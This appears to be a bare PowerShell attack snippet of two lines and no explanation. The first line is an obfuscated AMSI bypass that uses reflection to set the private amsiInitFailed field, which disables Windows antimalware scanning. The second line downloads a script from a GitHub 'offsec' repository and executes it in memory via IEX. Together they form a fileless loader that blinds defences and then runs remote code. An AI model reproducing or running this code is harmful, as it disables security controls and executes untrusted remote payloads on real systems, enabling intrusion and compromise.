$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'; $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)); $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'); $field.SetValue($null,$true)

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/refs/heads/main/basic.ps1') | IEX
